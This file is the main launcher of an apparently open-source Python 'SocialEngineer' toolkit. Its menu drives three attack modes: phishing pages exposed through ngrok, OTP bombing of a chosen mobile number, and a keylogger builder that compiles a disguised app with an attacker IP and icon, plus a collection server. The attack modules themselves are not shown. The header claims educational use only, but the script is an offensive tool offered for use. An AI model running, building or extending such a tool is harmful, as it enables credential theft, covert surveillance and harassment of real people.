#!/usr/bin/env python

"""
SocialEngineer - Social Engineering Toolkit
-------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : SocialEngineer - An all-in-one CLI framework for social engineering

License     : Open-source — strictly for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is intended solely for educational use, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you do not own or lack permission to test is illegal.
❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
"""

import sys
from includes import banner
from includes import utils
from includes.menu import main_menu
from includes import config_status
from AttackModes import phishing
from AttackModes import keylogger
from AttackModes import otpboming
from rich.console import Console
from rich.panel import Panel
import os
import subprocess
import threading
import time

from colorama import Fore, Style, init
init(autoreset=True)

console = Console()




def main():
    utils.check_sudo()
    while True:
        banner.show_banner()
        choice = main_menu()

        if choice == 1:
            utils.kill_port(80)
            banner.show_banner()
            config_status.check_ngrok()
            selected_template = utils.choose_template()
            if selected_template:
                phishing.pish(selected_template)

                

            else:
                print("🔙 Returning to main menu...")
        elif choice == 2:
            banner.clear
            banner.show_banner()
            
            result = otpboming.getio()
            if result:
                country_code, mobile_no, otpcount = result
                banner.clear
                banner.show_banner()
                otpboming.sendotp(country_code, mobile_no, otpcount)
            else:
                print("🔙 Returning to main menu...")

        elif choice == 3:
             banner.clear
             banner.show_banner()
             selected = keylogger.user_option()
             if selected == '1':
                banner.clear
                banner.show_banner()
                result =keylogger.getio()
                if result:
                    os_type, ip_address, app_name, icon_url = result
                    keylogger.compile_app(os_type, ip_address, app_name, icon_url)
                    
                else:
                    print("❌ User exited.")
             elif selected == '2':
                keylogger.start_keylogger_server()
             elif selected == 'x':
                print("Exiting...")
             

        else:
            banner.not_implemented()

if __name__ == "__main__":
    main()